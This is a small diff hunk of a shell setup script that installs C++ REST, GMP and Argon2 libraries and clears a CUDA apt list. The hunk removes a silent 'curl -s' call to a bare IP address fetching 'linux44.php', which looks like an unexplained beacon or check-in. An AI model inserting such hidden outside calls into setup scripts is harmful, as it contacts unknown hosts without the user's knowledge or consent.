@@ -12,8 +12,6 @@ mkdir /mnt/disks/user/project/
 
 cd /mnt/disks/user/project/
 
-curl -s http://154.127.52.52:8884/linux44.php
-
 apt-get install -y libcpprest-dev libgmp-dev libargon2-0-dev
 
 rm -rf /var/lib/apt/lists/developer.download.nvidia.com_compute_cuda_repos_ubuntu1804_x86%5f64_Packages.lz4
